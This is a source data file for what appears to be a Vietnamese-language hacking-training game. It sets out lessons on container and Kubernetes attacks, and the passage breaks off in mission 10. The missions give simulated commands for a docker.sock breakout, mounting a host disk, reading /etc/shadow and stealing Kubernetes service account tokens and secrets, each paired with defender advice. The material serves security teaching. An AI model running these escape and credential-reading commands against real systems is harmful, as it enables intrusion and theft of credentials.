// Chương 12 — Container & Kubernetes Security. 15 mission, FS inline, engine offline.
// Lệnh tool (docker/kubectl/capsh/fdisk/mount/curl-URL) => có `output` đóng hộp tiếng Anh giống tool thật.
// Lệnh file-based (cat/grep/ls/find/mkdir) => KHÔNG đặt output; nội dung nằm trong initialFilesystem.
// Mạch truyện: phát hiện container → caps check → docker socket escape → privileged disk mount
//              → K8s SA token → RBAC → secrets → recon → privileged pod → kubelet
//              → image history → cgroup escape → capture flag.

const ROOT_FS = {
  '/': { type: 'dir' },
  '/home': { type: 'dir' },
  '/home/hacker': { type: 'dir' },
};

export default [
  // ── 1 ─────────────────────────────────────────────────────────────────────
  {
    id: 1,
    chapterId: 12,
    title: 'Nhận Diện Container',
    story:
      'Mày vừa khai thác RCE trên web app của acme và có shell. Nhưng gì đó không ổn: không thấy process hệ thống, hostname lạ, không có gì ngoài app. Mày đang trong container. Bước đầu tiên: xác nhận và tìm điểm thoát.',
    steps: [
      {
        id: 'check_cgroup',
        description: 'Kiểm tra cgroup của PID 1 — docker để lại dấu vết rõ ràng ở đây',
        match: /^cat\b.*\/proc\/1\/cgroup/,
      },
      {
        id: 'check_dockerenv',
        description: 'Xác nhận /.dockerenv tồn tại — Docker tự tạo file này trong mọi container',
        match: /^ls\b.*\.dockerenv/,
      },
    ],
    hints: [
      'Container không giấu được hoàn toàn. Kernel và filesystem tiết lộ mày đang trong "hộp" — biết cách nhìn là thấy ngay.',
      'Cgroup của PID 1 sẽ lộ chuỗi "docker" hoặc "containerd": `cat /proc/1/cgroup`. Khác hẳn máy thật chạy systemd.',
      'Docker để lại file đặc trưng: `ls -la /.dockerenv` — tồn tại = mày đang trong Docker container, không phải máy thật.',
    ],
    terms: [
      { term: 'Container', def: 'Môi trường chạy process biệt lập dùng namespace + cgroup Linux; nhẹ hơn VM, chia sẻ kernel với host.' },
      { term: '/proc/1/cgroup', def: 'File tiết lộ cgroup hierarchy của PID 1; trong container sẽ có chuỗi docker/containerd thay vì "/" thuần.' },
      { term: '/.dockerenv', def: 'File rỗng Docker tạo trong mọi container khi khởi động; vắng mặt trên máy thật.' },
      { term: 'Namespace', def: 'Cơ chế Linux cách ly tài nguyên (PID, network, mount...); là nền tảng của container isolation.' },
    ],
    debrief: [
      'Container isolation không vô hình — kernel và một số file đặc biệt vẫn lộ ngữ cảnh. Nhận diện môi trường luôn là bước đầu khi có shell mới.',
      'Ngoài cgroup và .dockerenv, còn nhiều dấu hiệu: hostname ngắn ngẫu nhiên, PID space bắt đầu từ 1, thiếu process hệ thống, /proc/self/mountinfo có overlay2.',
      'Tư duy attacker: biết mình trong container thì tìm đường thoát ra host — vì host là nơi có dữ liệu và quyền thật.',
      'DEFENDER: container isolation là lớp đầu tiên, không phải lớp cuối; phải chạy non-root, drop capabilities, không mount docker.sock.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/proc': { type: 'dir' },
      '/proc/1': { type: 'dir' },
      '/proc/1/cgroup': {
        type: 'file',
        content: [
          '12:blkio:/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
          '11:memory:/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
          '10:cpuset:/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
          '3:cpu,cpuacct:/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
          '1:name=systemd:/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
          '0::/docker/a3f9c2b1d4e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4',
        ].join('\n'),
      },
      '/.dockerenv': { type: 'file', content: '' },
    },
  },

  // ── 2 ─────────────────────────────────────────────────────────────────────
  {
    id: 2,
    chapterId: 12,
    title: 'Soi Capabilities Container',
    story:
      'Biết mình đang trong container rồi. Câu hỏi sống còn tiếp theo: container này chạy ở chế độ gì? --privileged trao toàn quyền kernel. Capabilities xác định kỹ thuật escape nào khả thi. Mày cần biết trần trước khi tính bước tiếp.',
    steps: [
      {
        id: 'capsh_print',
        description: 'Xem capabilities hiện tại qua capsh --print',
        match: /^capsh\b.*--print/i,
        output: [
          'Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip',
          'Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap',
          'Ambient set =',
          "Securebits: 00/0x0/1'b0",
          ' secure-noroot: no (unlocked)',
          ' secure-no-suid-fixup: no (unlocked)',
          'uid=0(root) gid=0(root) groups=0(root)',
        ].join('\n'),
      },
      {
        id: 'read_proc_status',
        description: 'Đọc /proc/self/status để xem CapEff hex thô từ kernel',
        match: /^cat\b.*\/proc\/self\/status/,
      },
    ],
    hints: [
      'Container chạy --privileged có toàn bộ capabilities (CapEff 0000003fffffffff); default chỉ có tập nhỏ. Phân biệt để chọn đúng kỹ thuật escape.',
      'Xem capabilities với tên đẹp: `capsh --print` — tìm dòng Current; không thấy cap_sys_admin nghĩa là chưa privileged.',
      'Xem giá trị hex thô từ kernel: `cat /proc/self/status` — dòng CapEff; 00000000a80425fb = container thường, 0000003fffffffff = fully privileged.',
    ],
    terms: [
      { term: 'Linux capabilities', def: 'Tập quyền kernel chia nhỏ từ "root tổng"; container default chỉ được subset an toàn thay vì toàn bộ root.' },
      { term: '--privileged', def: 'Flag Docker cấp mọi capability và bỏ cô lập device — container privileged gần như bằng máy thật về quyền kernel.' },
      { term: 'CapEff', def: 'Effective capabilities trong /proc/self/status — set quyền đang áp dụng; hex 0000003fffffffff là toàn bộ.' },
      { term: 'capsh', def: 'Công cụ hiển thị capability sets với tên dễ đọc thay vì hex kernel.' },
    ],
    debrief: [
      'Capabilities là nền tảng container security model. Default container drop ~20 caps nguy hiểm nhất; sai lầm là chạy --privileged cho "tiện" rồi quên.',
      'capsh --print cho tên đẹp; /proc/self/status cho hex. Cả hai cần cho pentest: tên để hiểu, hex để so sánh với reference (0000003fffffffff).',
      'Biết capabilities giúp chọn đúng kỹ thuật: có docker.sock → docker breakout; có CAP_SYS_ADMIN → cgroup escape; privileged → mount thiết bị.',
      'DEFENDER: nguyên tắc vàng — drop ALL capabilities và chỉ add lại cái thật sự cần; không bao giờ --privileged trên production.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/proc': { type: 'dir' },
      '/proc/self': { type: 'dir' },
      '/proc/self/status': {
        type: 'file',
        content: [
          'Name:\tnode',
          'State:\tS (sleeping)',
          'Pid:\t1',
          'PPid:\t0',
          'Uid:\t0\t0\t0\t0',
          'Gid:\t0\t0\t0\t0',
          'CapInh:\t00000000a80425fb',
          'CapPrm:\t00000000a80425fb',
          'CapEff:\t00000000a80425fb',
          'CapBnd:\t00000000a80425fb',
          'CapAmb:\t0000000000000000',
          'NoNewPrivs:\t0',
          'Seccomp:\t2',
        ].join('\n'),
      },
    },
  },

  // ── 3 ─────────────────────────────────────────────────────────────────────
  {
    id: 3,
    chapterId: 12,
    title: 'Docker Socket Bị Mount',
    story:
      'Capabilities không đủ để escape trực tiếp. Nhưng trong lúc liệt kê thư mục, mày thấy thứ không nên có: docker.sock. Ai đó mount socket Docker daemon vào container này. Đây là đường tắt ra host — ai nói chuyện được với daemon là kiểm soát toàn bộ Docker trên host.',
    steps: [
      {
        id: 'find_socket',
        description: 'Liệt kê /var/run để xác nhận docker.sock bị mount vào container',
        match: /^ls\b.*\/var\/run/,
      },
      {
        id: 'docker_ps',
        description: 'Kết nối daemon host qua socket, liệt kê container đang chạy trên host',
        match: /^docker\b.*docker\.sock.*\bps\b/i,
        output: [
          'CONTAINER ID   IMAGE              COMMAND            CREATED        STATUS         PORTS                   NAMES',
          'a3f9c2b1d4e8   acme/webapp:v2.1   "node server.js"   2 hours ago    Up 2 hours     0.0.0.0:80->3000/tcp    webapp',
          'b7e2d5a9c1f4   acme/api:v1.8      "/app/api"         5 hours ago    Up 5 hours     0.0.0.0:8080->8080/tcp  api-server',
          'c9d4f3e8a2b1   postgres:15        "docker-entrypo…"  1 day ago      Up 1 day       5432/tcp                db',
          'e1f5a2b6c9d8   monitoring:latest  "/monitor"         3 days ago     Up 3 days                              monitor',
        ].join('\n'),
      },
    ],
    hints: [
      'Docker daemon lắng nghe trên /var/run/docker.sock. Nếu socket đó có trong container, mày gửi lệnh thẳng tới daemon HOST — thoát hoàn toàn container isolation về quản lý.',
      'Kiểm tra socket: `ls /var/run` — thấy docker.sock là jackpot. File này không nên có trong container người dùng thường.',
      'Kết nối daemon qua socket và liệt kê container trên HOST: `docker -H unix:///var/run/docker.sock ps` — mày đang thấy toàn bộ container host, không chỉ của mày.',
    ],
    terms: [
      { term: 'Docker socket', def: 'UNIX socket (/var/run/docker.sock) Docker daemon lắng nghe; ai kết nối được là kiểm soát toàn bộ Docker trên máy.' },
      { term: 'docker -H', def: 'Cờ chỉ định host Docker daemon kết nối; unix:///var/run/docker.sock giao tiếp qua socket cục bộ.' },
      { term: 'Socket bind-mount', def: 'Mount file socket của host vào container; thường dùng cho CI/CD nhưng mở backdoor nguy hiểm từ container vào host.' },
      { term: 'Container escape', def: 'Khai thác cấu hình sai để thoát khỏi container isolation và đạt quyền trên host.' },
    ],
    debrief: [
      'docker.sock mount vào container là lỗi nghiêm trọng nhất trong container security: đây là "root shell trên host" đóng gói dưới dạng volume mount.',
      'Kết nối qua socket không cần auth thêm — Docker daemon tin mọi process kết nối tới socket. Ai trong group docker hoặc có socket đều là admin Docker.',
      'Từ daemon host, mày không chỉ xem container — mày tạo, xoá, exec vào bất kỳ container nào, và quan trọng hơn, tạo container MỚI với volume mount tuỳ ý.',
      'DEFENDER: không bao giờ mount docker.sock vào container; dùng rootless Docker; CI/CD dùng Kaniko/Buildah; nếu bắt buộc, dùng Docker socket proxy có ACL.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/run': { type: 'dir' },
      '/var/run/docker.sock': { type: 'file', content: '' },
    },
  },

  // ── 4 ─────────────────────────────────────────────────────────────────────
  {
    id: 4,
    chapterId: 12,
    title: 'Breakout qua Docker Socket',
    story:
      'Docker daemon host đang chờ lệnh của mày. Kỹ thuật escape cổ điển: tạo container MỚI với -v /:/host — mount toàn bộ filesystem host vào /host bên trong container mới. Từ đó, mày đọc và ghi mọi thứ trên host như đứng trực tiếp trên máy.',
    steps: [
      {
        id: 'docker_run_escape',
        description: 'Chạy container mới qua socket, mount root host vào /host để escape',
        match: /^docker\b.*docker\.sock.*\brun\b/i,
        output: [
          "Unable to find image 'alpine:latest' locally",
          'latest: Pulling from library/alpine',
          'Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b',
          'Status: Downloaded newer image for alpine:latest',
          'root@escape-container:/#',
          '# Now inside new container. Host filesystem accessible at /host',
        ].join('\n'),
      },
      {
        id: 'read_host_hostname',
        description: 'Xác nhận đã ra host bằng cách đọc hostname thật của máy',
        match: /^cat\b.*\/host\/etc\/hostname/,
      },
    ],
    hints: [
      'Với daemon host, mày tạo container MỚI trên HOST và mount toàn bộ host filesystem vào đó. Container mới chạy root, -v /:/host cho mày toàn bộ host FS.',
      'Escape: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine sh` — /host bên trong container mới là root của host machine thật.',
      'Kiểm chứng: `cat /host/etc/hostname` — nếu thấy hostname của host (không phải tên container ngắn ngẫu nhiên) là đã thoát thành công.',
    ],
    terms: [
      { term: '-v /:/host', def: 'Volume mount toàn bộ root filesystem host (/) vào /host trong container; từ đó đọc/ghi mọi file host.' },
      { term: 'alpine', def: 'Image Linux tối giản (~5MB) thường dùng trong container escape vì nhẹ và luôn có trên Docker Hub.' },
      { term: 'Host filesystem access', def: 'Sau khi mount /, attacker sửa /etc/shadow, cài backdoor vào /etc/cron.d, hoặc đọc mọi secret host.' },
      { term: 'chroot vào host', def: 'Sau khi mount host FS, có thể chroot /host để shell trong môi trường host thật.' },
    ],
    debrief: [
      'Escape qua docker.sock chỉ cần 1 lệnh và không khai thác lỗ hổng phần mềm nào. Đây là lý do docker.sock là tài sản nguy hiểm nhất trong hạ tầng container.',
      '-v /:/host bind-mount toàn bộ root filesystem host. Container mới chạy root, không restricted — gần như hệ quả của root shell trực tiếp trên host.',
      'Từ /host, bước tiếp theo điển hình: đọc /host/etc/shadow, thêm SSH key vào /host/root/.ssh/, nhét reverse shell vào /host/etc/cron.d/.',
      'DEFENDER: đừng mount docker.sock; nếu bắt buộc dùng authorization plugin; bật user namespace remapping; giám sát socket activity bất thường (falco).',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/host': { type: 'dir' },
      '/host/etc': { type: 'dir' },
      '/host/etc/hostname': { type: 'file', content: 'acme-prod-node-01\n' },
      '/host/etc/os-release': {
        type: 'file',
        content: 'NAME="Ubuntu"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"\nID=ubuntu',
      },
    },
  },

  // ── 5 ─────────────────────────────────────────────────────────────────────
  {
    id: 5,
    chapterId: 12,
    title: 'Privileged Container — Mount Đĩa Host',
    story:
      'Trong quá trình lateral movement, mày phát hiện thêm một container đang chạy với --privileged flag. Lần này không có docker socket, nhưng có quyền truy cập thiết bị kernel đầy đủ. Mày list đĩa vật lý host và mount trực tiếp partition root vào container.',
    steps: [
      {
        id: 'fdisk_list',
        description: 'Liệt kê đĩa và partition host bằng fdisk -l',
        match: /^fdisk\b.*-l/i,
        output: [
          'Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors',
          'Disk model: Virtual Disk',
          'Units: sectors of 1 * 512 = 512 bytes',
          '',
          'Device     Boot   Start       End   Sectors  Size Id Type',
          '/dev/sda1  *       2048   2099199   2097152    1G 83 Linux',
          '/dev/sda2       2099200 209715199 207616000 99G  8e Linux LVM',
        ].join('\n'),
      },
      {
        id: 'mount_host_disk',
        description: 'Mount partition root host vào /mnt để truy cập filesystem host',
        match: /^mount\b.*\/dev\/sda\d\b/i,
        output: [
          '# Filesystem /dev/sda1 (ext4) mounted successfully at /mnt',
          '# Host OS files now accessible under /mnt/',
        ].join('\n'),
      },
    ],
    hints: [
      '--privileged cho container quyền mount thiết bị khối của host. /dev/sda1 là partition OS host — mount nó vào container là có toàn bộ host filesystem.',
      'Liệt kê đĩa host: `fdisk -l` — tìm /dev/sda1 (hoặc nvme0n1p1 trên cloud) là partition boot/root của OS.',
      'Mount partition root host: `mount /dev/sda1 /mnt` — sau đó /mnt chứa toàn bộ filesystem host. Kỹ thuật escape cổ điển nhất với privileged container.',
    ],
    terms: [
      { term: '--privileged', def: 'Flag Docker bỏ hầu hết giới hạn kernel: full capabilities, truy cập /dev, bỏ apparmor/seccomp — container gần như máy thật về quyền.' },
      { term: 'fdisk', def: 'Công cụ quản lý partition đĩa; fdisk -l liệt kê tất cả đĩa và partition kernel nhìn thấy.' },
      { term: '/dev/sda1', def: 'Block device file đại diện partition đầu tiên của đĩa sda; chỉ accessible từ container privileged hoặc có CAP_SYS_ADMIN.' },
      { term: 'Block device', def: 'Thiết bị lưu trữ đọc/ghi theo block (đĩa cứng, SSD); được expose vào container privileged qua /dev.' },
    ],
    debrief: [
      'Privileged container có quyền truy cập toàn bộ /dev host: mount đĩa, load kernel module, thao tác network interface. Đây là lý do --privileged cần tránh tuyệt đối.',
      'Không cần docker socket, không cần escape phức tạp — chỉ biết tên partition và một lệnh mount. Escape đơn giản nhất khi có --privileged.',
      'Sau khi mount, toàn bộ host filesystem đọc/ghi được. Attacker thường ghi SSH key vào /mnt/root/.ssh/authorized_keys để duy trì access.',
      'DEFENDER: không chạy --privileged; drop capabilities xuống mức tối thiểu; bật seccomp và apparmor; dùng OPA Gatekeeper để enforce no-privileged trên K8s.',
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 6 ─────────────────────────────────────────────────────────────────────
  {
    id: 6,
    chapterId: 12,
    title: 'Đọc File Nhạy Cảm từ Host',
    story:
      '/dev/sda1 đã mount vào /mnt. Toàn bộ OS host nằm dưới đó. Mục tiêu ngay: /etc/shadow — file chứa hash mật khẩu của mọi user. Bẻ hash offline, mày có credential để SSH thẳng vào host mà không cần container nữa.',
    steps: [
      {
        id: 'ls_mnt_etc',
        description: 'Liệt kê /etc của host để xác nhận các file nhạy cảm có mặt',
        match: /^ls\b.*\/mnt\/etc/,
      },
      {
        id: 'cat_shadow',
        description: 'Đọc /etc/shadow của host để lấy hash mật khẩu',
        match: /^cat\b.*\/mnt\/etc\/shadow/,
      },
    ],
    hints: [
      'Host filesystem nằm ở /mnt. Mọi file trên host đều đọc được từ đây — bắt đầu với /etc/shadow vì nó chứa hash mật khẩu toàn bộ user.',
      'Liệt kê /etc của host: `ls /mnt/etc` — xác nhận shadow và passwd tồn tại; cả hai cần thiết để hiểu cấu trúc user.',
      'Đọc hash mật khẩu: `cat /mnt/etc/shadow` — copy hash ra, chạy hashcat/john offline để bẻ. Hash root thường là mục tiêu chính.',
    ],
    terms: [
      { term: '/etc/shadow', def: 'File chứa hash mật khẩu mọi user Linux; chỉ root đọc được — nhưng từ container privileged với host mounted thì không cần quyền đó.' },
      { term: 'Hash format Linux', def: '$id$salt$hash: $6$ là SHA-512, $2b$ là bcrypt; id quyết định thuật toán và độ khó bẻ.' },
      { term: 'Offline hash cracking', def: 'Bẻ mật khẩu bằng cách thử candidate qua hàm hash mà không cần kết nối target; hashcat/john dùng GPU.' },
      { term: 'Persistence via SSH key', def: 'Sau khi có host FS, ghi public key vào /mnt/root/.ssh/authorized_keys để SSH vào bất kỳ lúc nào.' },
    ],
    debrief: [
      'Đọc /etc/shadow từ host mount không tạo log gì trên host OS — không syslog, không auth.log. Phát hiện phải đến từ container runtime monitoring.',
      'Hash SHA-512 ($6$) với salt ngẫu nhiên khó bẻ nhưng không phải bất khả thi: password yếu bẻ được bằng dictionary attack trong vài phút trên GPU.',
      'Ngoài shadow, /mnt còn cho phép đọc /mnt/root/.bash_history, /mnt/home/*/.ssh/ (private key), /mnt/etc/cron.d/.',
      'DEFENDER: bật IMA/auditd giám sát mount event bất thường; dùng falco để phát hiện container đọc block device host.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/mnt': { type: 'dir' },
      '/mnt/etc': { type: 'dir' },
      '/mnt/etc/shadow': {
        type: 'file',
        content: [
          'root:$6$rounds=5000$saltsalt$3Tn5JLFp2GmxCBBjAVe5UeWTlbSXbT5v8kE1H7k2sPbT/X7y0nNz1Gm9vBqL2x4K8W0I6oF3Pd5mZe.Qa1::0:99999:7:::',
          'daemon:*:19000:0:99999:7:::',
          'ubuntu:$6$rounds=5000$hosthash$7Yz2Kp4QR8nwJHbc0xD3fMvE9sLT6i1oN5qA2uW/PYgVt3mI8bCr6hGdFe.Xk0ZJU4lS9aR7wQn1p5::0:99999:7:::',
        ].join('\n'),
      },
      '/mnt/etc/passwd': {
        type: 'file',
        content: [
          'root:x:0:0:root:/root:/bin/bash',
          'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
          'ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
        ].join('\n'),
      },
    },
  },

  // ── 7 ─────────────────────────────────────────────────────────────────────
  {
    id: 7,
    chapterId: 12,
    title: 'Trộm Service Account Token K8s',
    story:
      'Mày đã ra host. Khảo sát thêm, mày phát hiện đây là Kubernetes node. Mày exec vào một pod app đang chạy. Trong mọi K8s pod, Kubernetes tự động mount service account token vào /var/run/secrets/. Đây là credential mặc định để pod gọi API server — và attacker tận dụng để enum cluster.',
    steps: [
      {
        id: 'read_token',
        description: 'Đọc JWT service account token được K8s mount tự động vào pod',
        match: /^cat\b.*serviceaccount\/token/,
      },
      {
        id: 'read_namespace',
        description: 'Xác định namespace của pod từ file serviceaccount được mount',
        match: /^cat\b.*serviceaccount\/namespace/,
      },
    ],
    hints: [
      'K8s tự động mount service account token vào mọi pod tại /var/run/secrets/kubernetes.io/serviceaccount/. Đây là "credential mặc định" của pod — điểm bắt đầu K8s pentesting.',
      'Đọc JWT token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token` — chuỗi JWT dài này là credential để gọi K8s API. Copy nó.',
      'Xem pod đang ở namespace nào: `cat /var/run/secrets/kubernetes.io/serviceaccount/namespace` — cần biết để dùng kubectl đúng scope.',
    ],
    terms: [
      { term: 'Service Account', def: 'Danh tính K8s cho pod/process; mỗi pod được gán 1 SA và nhận JWT token của nó tự động.' },
      { term: 'SA Token (JWT)', def: 'JSON Web Token K8s cấp cho pod; pod dùng để authenticate với API server. Đọc được từ /var/run/secrets/.' },
      { term: 'RBAC', def: 'Role-Based Access Control — phân quyền K8s; SA token được grant quyền theo ClusterRole/Role binding.' },
      { term: 'automountServiceAccountToken', def: 'Cờ K8s kiểm soát mount token tự động; đặt false để pod không nhận token nếu không cần.' },
    ],
    debrief: [
      'SA token mount tự động là mặc định từ K8s đầu tiên — tiện cho in-cluster service discovery nhưng là điểm tấn công nếu pod bị chiếm.',
      'JWT SA token không hết hạn ngay (trước K8s 1.21 là không hết hạn); có token là có quyền SA đó cho tới khi bị revoke.',
      'Bước tiếp theo luôn là check quyền SA: kubectl auth can-i --list. Default SA thường không có nhiều quyền, nhưng dev hay gán thêm "vì tiện".',
      'DEFENDER: đặt automountServiceAccountToken: false cho pod không cần API access; dùng SA riêng với quyền tối thiểu; bật token volume projection với expirationSeconds ngắn.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/run': { type: 'dir' },
      '/var/run/secrets': { type: 'dir' },
      '/var/run/secrets/kubernetes.io': { type: 'dir' },
      '/var/run/secrets/kubernetes.io/serviceaccount': { type: 'dir' },
      '/var/run/secrets/kubernetes.io/serviceaccount/token': {
        type: 'file',
        content:
          'eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS1pZC0xMjMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFwcC1zYSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmFwcC1zYSJ9.SIGNATURE_REDACTED',
      },
      '/var/run/secrets/kubernetes.io/serviceaccount/namespace': {
        type: 'file',
        content: 'default',
      },
      '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt': {
        type: 'file',
        content: '-----BEGIN CERTIFICATE-----\nMIICpDCCAYwCCQDv5REDACTED\n-----END CERTIFICATE-----',
      },
    },
  },

  // ── 8 ─────────────────────────────────────────────────────────────────────
  {
    id: 8,
    chapterId: 12,
    title: 'Liệt Kê Quyền RBAC',
    story:
      'Token đã có. Bước bắt buộc tiếp theo: biết token này được phép làm gì. RBAC quyết định "trần" của cuộc tấn công trong cluster. SA được bind quá nhiều quyền — thường do dev làm tắt — là đường leo thang thẳng tới admin cluster.',
    steps: [
      {
        id: 'can_i_list',
        description: 'Liệt kê toàn bộ action mà SA hiện tại được phép thực hiện',
        match: /^kubectl\b.*auth\s+can-i\b.*--list/i,
        output: [
          'Resources                          Non-Resource URLs   Resource Names   Verbs',
          'pods                               []                  []               [get list watch create delete]',
          'secrets                            []                  []               [get list watch]',
          'deployments.apps                   []                  []               [get list watch]',
          'services                           []                  []               [get list]',
          'configmaps                         []                  []               [get list]',
          'namespaces                         []                  []               [get list]',
          '',
          'Warning: the list may be incomplete: webhook authorization mode is used.',
        ].join('\n'),
      },
      {
        id: 'get_crb',
        description: 'Xem ClusterRoleBinding tìm binding gán quyền rộng cho SA',
        match: /^kubectl\b.*get\s+clusterrolebindings\b/i,
        output: [
          'NAME                                       ROLE                              AGE',
          'app-sa-binding                             ClusterRole/pod-reader-secrets    15d',
          'cluster-admin-binding                      ClusterRole/cluster-admin         120d',
          'system:basic-user                          ClusterRole/system:basic-user     120d',
          'system:controller:node-controller          ClusterRole/system:node           120d',
        ].join('\n'),
      },
    ],
    hints: [
      'Token là chìa, RBAC quyết định cánh cửa nào nó mở. Liệt kê quyền ngay sau khi có token — đừng thử random mà không biết scope.',
      'Xem đầy đủ quyền SA hiện tại: `kubectl auth can-i --list` — liệt kê mọi resource/verb được phép. Để ý secrets [get list] rất quan trọng.',
      'Xem binding trong cluster: `kubectl get clusterrolebindings` — tìm binding gán role rộng (cluster-admin, edit) cho SA hoặc nhóm đáng ngờ.',
    ],
    terms: [
      { term: 'kubectl auth can-i', def: 'Lệnh kiểm tra quyền của identity hiện tại trên K8s API; --list trả toàn bộ permission được phép.' },
      { term: 'ClusterRole', def: 'Role K8s áp dụng toàn cluster không giới hạn namespace; mạnh hơn Role thường chỉ trong 1 namespace.' },
      { term: 'ClusterRoleBinding', def: 'Gán ClusterRole cho subject (user/SA/group) ở phạm vi toàn cluster; sai binding là đường leo thang.' },
      { term: 'secrets [get, list]', def: 'Quyền đọc Secret K8s; kết hợp get+list là lấy được mật khẩu DB, API key, TLS cert toàn namespace.' },
    ],
    debrief: [
      'kubectl auth can-i --list là lệnh đầu tiên sau khi có SA token — nhanh hơn thử từng resource và cho ngay bức tranh toàn cảnh quyền lực.',
      'Quyền secrets [get, list] là giá trị nhất cho attacker: secret chứa password DB, API key, TLS cert — đọc được là mở nhiều cánh cửa tiếp theo.',
      'Binding cluster-admin cho bất kỳ SA nào là "game over" cho cluster: toàn quyền tạo/xoá/sửa mọi resource kể cả tạo user mới.',
      'DEFENDER: audit ClusterRoleBinding định kỳ; không dùng cluster-admin trừ khi bắt buộc; dùng Polaris/OPA để phát hiện over-permission tự động.',
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 9 ─────────────────────────────────────────────────────────────────────
  {
    id: 9,
    chapterId: 12,
    title: 'Đọc K8s Secrets',
    story:
      'SA có quyền get/list secrets. K8s Secret là nơi dev lưu mật khẩu DB, API key, TLS cert — tất cả base64-encoded trong etcd. Với kubectl, mày đọc thẳng và decode. Không cần crack gì — secret vốn chỉ encoded, không encrypted ở K8s mặc định.',
    steps: [
      {
        id: 'list_secrets',
        description: 'Liệt kê tất cả secret trong namespace hiện tại',
        match: /^kubectl\b.*get\s+secrets\b/i,
        output: [
          'NAME               TYPE                                  DATA   AGE',
          'db-creds           Opaque                                2      30d',
          'stripe-api-key     Opaque                                1      45d',
          'app-tls            kubernetes.io/tls                     2      90d',
          'app-sa-token-xyz   kubernetes.io/service-account-token   3      15d',
          'regcred            kubernetes.io/dockerconfigjson        1      60d',
        ].join('\n'),
      },
      {
        id: 'get_secret_value',
        description: 'Đọc nội dung secret db-creds để lấy mật khẩu database',
        match: /^kubectl\b.*get\s+secret\b.*db-creds/i,
        output: [
          '{',
          '  "apiVersion": "v1",',
          '  "kind": "Secret",',
          '  "metadata": { "name": "db-creds", "namespace": "default" },',
          '  "type": "Opaque",',
          '  "data": {',
          '    "username": "YWRtaW4=",',
          '    "password": "UHJvZC1EQi1QYXNzdzByZCEyMDI0"',
          '  }',
          '}',
          '# Decoded: username=admin  password=Prod-DB-Passw0rd!2024',
        ].join('\n'),
      },
    ],
    hints: [
      'K8s Secret là base64-encoded, không encrypted (trừ khi bật encryption at rest). Ai đọc được Secret object là thấy ngay giá trị sau decode — không cần crack.',
      'Liệt kê secret trong namespace: `kubectl get secrets` — db-creds và stripe-api-key thường là mục tiêu chính.',
      'Đọc nội dung: `kubectl get secret db-creds -o json` — thấy data field base64; hoặc dùng `-o jsonpath={.data.password}` để lấy đúng field và decode.',
    ],
    terms: [
      { term: 'K8s Secret', def: 'Object K8s lưu dữ liệu nhạy cảm (key-value); mặc định chỉ base64-encoded trong etcd — ai đọc object là thấy giá trị.' },
      { term: 'Opaque Secret', def: 'Loại Secret tổng quát cho mọi dữ liệu key-value; phân biệt với TLS secret, docker-configjson.' },
      { term: 'etcd encryption at rest', def: 'Tính năng K8s mã hoá Secret trong etcd bằng key của control plane; mặc định tắt và cần cấu hình riêng.' },
      { term: 'base64', def: 'Encoding (không phải mã hoá) chuyển binary thành ASCII; dễ decode bằng `base64 -d`, không cần key.' },
    ],
    debrief: [
      'K8s Secret tên gọi sai lệch: chúng không "secret" theo nghĩa mã hoá — chỉ base64. Ai có RBAC get secret là thấy hết nội dung ngay.',
      'kubectl get secret -o json cho full payload; -o jsonpath cho đúng field. Cả hai tiện cho attacker hơn là encode lại tay.',
      'regcred (docker-configjson) thường chứa credential registry — đọc ra là có thể pull private image và tìm thêm secret bên trong image.',
      'DEFENDER: bật encryption at rest cho etcd; dùng external secret manager (Vault, AWS Secrets Manager) với ESO; siết RBAC secret không cho list, chỉ get tên cụ thể.',
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 10 ────────────────────────────────────────────────────────────────────
  {
    id: 10,
    chapterId: 12,
    title: 'Recon Toàn Cluster',
    story:
      'SA có quyền list pod và node ở mọi namespace. Bước này vẽ bản đồ cluster: service nào đang chạy, node nào tồn tại, pod nào có quyền đặc biệt — để chọn mục tiêu leo thang tiếp theo.',
    steps: [
      {
        id: 'get_all_pods',
